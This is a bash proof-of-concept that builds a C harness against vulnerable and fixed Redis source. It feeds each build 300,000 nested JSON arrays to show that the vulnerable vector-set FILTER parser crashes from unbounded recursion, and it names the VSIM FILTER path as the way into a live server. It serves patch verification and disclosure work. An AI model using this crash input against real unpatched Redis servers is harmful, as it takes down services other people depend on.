#!/usr/bin/env bash
# RedisRabbit PoC — Redis vector-sets FILTER JSON-parser unbounded recursion
# (CWE-674) -> stack-overflow crash. Demonstrates the vulnerable vs fixed
# differential against the *verbatim* Redis source:
#
#   src/        = vulnerable (Redis 8.0.1 .. 8.10.1)  — fastjson.c with NO depth cap
#   src-fixed/  = fixed     (Redis 8.10.2, commit 52194c8) — MAX_RECURSION_DEPTH_LIMIT=1000
#
# exit 0  = vulnerable code crashes (SIGSEGV) AND fixed code survives the same input
# exit 1  = differential not reproduced
# exit 2  = build environment missing a compiler
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
cd "$HERE"

# --- locate a C compiler ---------------------------------------------------
CC=""
for c in \
    /home/millie/tools/toolchain/x86_64-linux-musl-cross/bin/x86_64-linux-musl-gcc \
    /home/millie/tools/toolchain/zig-linux-x86_64-0.14.0/zig \
    cc gcc clang; do
  if command -v "$c" >/dev/null 2>&1; then CC="$c"; break; fi
  if [ -x "$c" ]; then CC="$c"; break; fi
done
if [ -z "$CC" ]; then
  echo "ERROR: no C compiler found (need musl-gcc / zig cc / gcc / clang)"
  exit 2
fi
case "$CC" in *zig*) CC="$CC cc";; esac
echo "[*] compiler: $CC"

# --- build the vulnerable (src/) and fixed (src-fixed/) binaries -----------
echo "[*] building vulnerable binary (src/ = Redis <= 8.10.1) ..."
$CC -O1 -static -o harness_vuln harness.c 2>/tmp/opencode/redisrabbit_vuln.log \
  || { echo "ERROR: vulnerable build failed"; cat /tmp/opencode/redisrabbit_vuln.log; exit 2; }

echo "[*] building fixed binary (src-fixed/ = Redis 8.10.2) ..."
$CC -O1 -static -DVSET_EXPR_SRC='"src-fixed/expr.c"' -o harness_fixed harness.c \
  2>/tmp/opencode/redisrabbit_fixed.log \
  || { echo "ERROR: fixed build failed"; cat /tmp/opencode/redisrabbit_fixed.log; exit 2; }
echo "[*] builds OK"

# --- vulnerable: deep nesting must crash (SIGSEGV) -------------------------
echo
echo "=== [1] VULNERABLE (Redis <= 8.10.1): 300000 nested arrays ==="
timeout 60 ./harness_vuln 300000
vuln_rc=$?
echo "    (vulnerable binary exited with rc=$vuln_rc)"

# --- fixed: same input must NOT crash --------------------------------------
echo
echo "=== [2] FIXED (Redis 8.10.2): 300000 nested arrays ==="
timeout 60 ./harness_fixed 300000
fixed_rc=$?
echo "    (fixed binary exited with rc=$fixed_rc)"

echo
if [ $vuln_rc -eq 139 ] && [ $fixed_rc -eq 0 ]; then
  echo "RESULT: PASS — differential reproduced."
  echo "  vulnerable (fastjson.c, no depth cap): jsonParseArrayToken()/jsonParseValueToken()"
  echo "    recurse once per '[' with no limit -> stack exhausted -> SIGSEGV (rc=139)."
  echo "  fixed (8.10.2, MAX_RECURSION_DEPTH_LIMIT=1000): the same 600 KB attribute is"
  echo "    rejected cleanly once depth 1000 is reached (jsonExtractField returns NULL,"
  echo "    exprRun returns 0) -> no crash."
  echo "  In redis-server this code path (VSIM FILTER -> vectorSetFilterCallback -> exprRun)"
  echo "  crashes the whole server process; 8.10.2 closes it."
  exit 0
elif [ $vuln_rc -ge 128 ] && [ $fixed_rc -eq 0 ]; then
  echo "RESULT: PASS — vulnerable died with signal $(($vuln_rc - 128)); fixed survived (rc=0)."
  exit 0
else
  echo "RESULT: FAIL — vulnerable rc=$vuln_rc, fixed rc=$fixed_rc (expected 139 / 0)."
  exit 1
fi
